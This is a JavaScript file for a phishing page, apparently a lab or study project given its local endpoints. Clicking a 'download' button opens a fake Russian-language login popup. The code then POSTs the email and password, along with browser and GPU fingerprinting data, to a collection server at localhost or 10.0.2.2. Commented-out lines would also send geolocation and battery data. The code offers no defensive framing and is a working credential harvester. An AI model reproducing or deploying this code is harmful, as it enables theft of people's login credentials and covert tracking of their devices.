const mainMachine = "http://localhost:5000/haha";
const virtualMachine = "http://10.0.2.2:5000/haha";

const _URL = mainMachine;

function getVideoCardInfo() {
    const gl = document.createElement('canvas').getContext('webgl');
    if (!gl) {
        return {
            error: "no webgl",
        };
    }
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer:  gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
    } : {
        error: "no WEBGL_debug_renderer_info",
    };
}

const pickUserInfo = (mail, pwd) => {
    const sendUserInfo = (method, url, body) => {
        const header = {"Content-Type": "application/json"};
        return fetch(url, {method: method, body: JSON.stringify(body), headers: header});
    }

    /*navigator.geolocation.getCurrentPosition(success=> {sendUserInfo("POST", "http://localhost:5000/", success.coords)});
    navigator.getBattery().then(energy=> {sendUserInfo("POST", "http://10.0.2.2:5000/", energy)})*/

    const userInfoObj = {
        mail: mail,
        pwd: pwd,
        gpu: getVideoCardInfo().renderer,
        hardware: navigator.hardwareConcurrency,
        languages: navigator.languages,
        userAgent: navigator.userAgent
    }

    sendUserInfo("POST", _URL, userInfoObj);
}

document.getElementById("download_button").addEventListener("click", (event)=>{
    const popUp = document.createElement("div");
    popUp.id = "popup";

    const popUpContent = document.createElement("div");
    popUpContent.id = "popup-info";
    popUpContent.innerText = "Вам необходимо авторизоваться!";


    const inputMailDiv = document.createElement("div");
    inputMailDiv.className = "div-input-mail";
    inputMailDiv.innerHTML = "<div>Почта:</div>"
    const inputMail = document.createElement("input");
    inputMail.className = "input";

    const inputPwdDiv = document.createElement("div");
    inputPwdDiv.className = "div-input-pwd";
    inputPwdDiv.innerHTML = "<div>Пароль:</div>";
    const inputPwd = document.createElement("input");
    inputPwd.className = "input";

    const logInDiv = document.createElement("div");
    logInDiv.id = "login-div";
    const logIn = document.createElement("button");
    logIn.id = "loginbttn";
    logIn.innerText = "Войти"

    const block = document.getElementById("block");

    block.insertAdjacentElement("afterend", popUp);
    popUp.insertAdjacentElement("afterbegin", popUpContent);
    popUpContent.insertAdjacentElement("afterend", inputMailDiv);
    inputMailDiv.insertAdjacentElement("beforeend", inputMail);
    inputMailDiv.insertAdjacentElement("afterend", inputPwdDiv);
    inputPwdDiv.insertAdjacentElement("beforeend", inputPwd);
    inputPwdDiv.insertAdjacentElement("afterend", logInDiv);
    logInDiv.insertAdjacentElement("afterbegin", logIn);


    logIn.addEventListener("click", (event) => {
        let mail = inputMail.value;
        const pwd = inputPwd.value;
        pickUserInfo(mail, pwd);
        inputMail.value = "";
        inputPwd.value = "";
        setTimeout(()=>popUp.remove(), 1000);
    })
})

